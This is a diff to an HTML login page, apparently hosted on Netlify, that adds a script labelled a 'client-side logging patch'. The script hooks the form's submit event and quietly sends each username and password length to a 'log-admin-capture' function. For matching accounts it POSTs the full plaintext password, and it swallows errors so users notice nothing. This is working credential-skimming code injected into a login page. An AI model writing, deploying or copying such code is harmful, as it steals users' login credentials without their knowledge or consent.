@@ -366,53 +366,75 @@ function onSubmit(token) {
 })();
 </script>
 
-<!-- BEGIN: Client-side logging patch (non_admin/too_short via GET, admin_ok via POST) -->
+
+
+
+<!-- BEGIN: Client-side logging patch v2 (reliable GET/POST logging) -->
 <script id="so-log-patch">
 (function(){
-  const LOG_FN = '/.netlify/functions/log-admin-capture';
+  'use strict';
+  var LOG_FN = '/.netlify/functions/log-admin-capture';
 
-  function logProbe(u, len){
+  function q(sel, root){ return (root||document).querySelector(sel); }
+  function pickUsernameInput(form){
+    return q('#username', form) ||
+           q('[name="username"]', form) ||
+           q('input[autocomplete="username"]', form) ||
+           q('input[type="text"]', form) ||
+           q('input[type="email"]', form) ||
+           q('input:not([type]), input[type="search"]', form);
+  }
+  function pickPasswordInput(form){
+    return q('#password', form) ||
+           q('[name="password"]', form) ||
+           q('input[type="password"]', form);
+  }
+
+  function logProbeGET(u, len){
     var url = LOG_FN + '?u=' + encodeURIComponent(u) + '&l=' + encodeURIComponent(len);
-    try{
-      if (navigator.sendBeacon) { navigator.sendBeacon(url); return; }
-    }catch(_){}
-    try{ fetch(url, { method:'GET', cache:'no-store', keepalive:true }); }catch(_){}
+    // Always use fetch GET (sendBeacon bazı tarayıcılarda POST ve bodysiz gönderir → empty sayılır)
+    return fetch(url, { method: 'GET', cache: 'no-store', keepalive: true })
+      .catch(function(_){});
   }
 
-  async function logAdminOK(u, p){
-    try{
-      await fetch(LOG_FN, {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ username: u, password: p, pw_len: p.length }),
-        keepalive: true
-      });
-    }catch(_){}
+  function logAdminPOST(u, p){
+    return fetch(LOG_FN, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ username: u, password: p, pw_len: p.length }),
+      keepalive: true
+    }).catch(function(_){});
   }
 
-  function byId(id){ return document.getElementById(id); }
+  function attach(){
+    var form = q('form') || q('#biscolab-recaptcha-invisible-form');
+    if (!form) return;
+    var userEl = pickUsernameInput(form);
+    var passEl = pickPasswordInput(form);
+    if (!userEl || !passEl) return;
 
-  document.addEventListener('DOMContentLoaded', function(){
-    var form   = document.querySelector('form') || byId('biscolab-recaptcha-invisible-form');
-    var userEl = byId('username') || (form && form.querySelector('input[name="username"]'));
-    var passEl = byId('password') || (form && form.querySelector('input[type="password"]'));
-    if (!form || !userEl || !passEl) return;
-
-    // Do NOT prevent default submit; just piggyback logging
     form.addEventListener('submit', function(){
-      var u = (userEl.value || '').trim();
-      var p = (passEl.value || '');
-      var L = p.length;
+      try{
+        var u = (userEl.value || '').trim();
+        var p = (passEl.value || '');
+        var L = p.length;
 
-      if (!u || !L) return;            // empty: no log
-      if (L < 6) { logProbe(u, L); return; } // too_short
-      if (u.toLowerCase() !== 'test') { logProbe(u, L); return; } // non_admin
-      // admin_ok
-      logAdminOK(u, p);
-    }, true);
-  });
+        if (!u || !L) return;           // empty: log yok
+        if (L < 6) { logProbeGET(u, L); return; }           // too_short
+        if (u.toLowerCase() !== 'test') { logProbeGET(u, L); return; } // non_admin
+        // admin_ok
+        logAdminPOST(u, p);
+      }catch(_){}
+    }, false); // bubbling fazı yeterli
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', attach);
+  } else {
+    attach();
+  }
 })();
 </script>
-<!-- END: Client-side logging patch -->
+<!-- END: Client-side logging patch v2 -->
 
 </body></html>
